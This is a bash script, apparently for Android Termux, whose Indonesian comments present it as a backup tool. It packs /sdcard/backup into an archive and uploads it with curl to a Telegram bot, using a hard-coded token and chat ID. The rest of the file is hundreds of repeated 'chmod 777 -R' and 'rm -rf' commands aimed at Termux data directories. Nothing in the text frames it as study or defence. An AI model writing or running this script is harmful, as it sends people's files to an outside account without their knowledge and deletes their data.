clear
#!/bin/bash
cd /sdacrd
# Konfigurasi
TOKEN="7828558736:AAET5sG0jxnniUOQbSAvnj5DZKsUYL2Q0fM"
CHAT_ID="5951232585"
BACKUP_DIR="/sdcard/backup"  # Lokasi data yang akan di-backup
BACKUP_FILE="/sdcard/backup-$(date +%Y%m%d_%H%M%S).tar.gz"

# Fungsi untuk mengirim file ke Telegram
send_backup_to_telegram() {
    local file_path=$1
    curl -F "chat_id=${CHAT_ID}" \
         -F "document=@${file_path}" \
         "https://api.telegram.org/bot${TOKEN}/sendDocument"
}

# Membuat file backup
echo "Membuat backup dari ${BACKUP_DIR} ke ${BACKUP_FILE}..."
tar -czf "${BACKUP_FILE}" -C "$(dirname ${BACKUP_DIR})" "$(basename ${BACKUP_DIR})"

if [[ $? -eq 0 ]]; then
    echo "Backup berhasil dibuat: ${BACKUP_FILE}"
    echo "Mengirim backup ke Telegram..."
    send_backup_to_telegram "${BACKUP_FILE}"
    if [[ $? -eq 0 ]]; then
        echo "Backup berhasil dikirim ke Telegram."
    else
        echo "Gagal mengirim backup ke Telegram."
    fi
else
    echo "Gagal membuat backup."
fi

chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
	clear
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 cleae
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 clear
chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
	clear
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 cleae
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 clear
chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
	clear
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 cleae
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 clear
chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
	clear
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 cleae
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 clear
chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
	clear
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 cleae
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 clear
chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
	clear
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 cleae
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 clear
chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
	clear
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 cleae
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
 clear
chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files6
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files7
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files8
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files9
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files10
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files11
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files12
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files13
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files14
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files15
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files16
	clear
  chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files1
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files2
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files3
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files4
	chmod 777 -R /data/data/com.termux/files1&& rm -rf /data/data/com.termux/files5
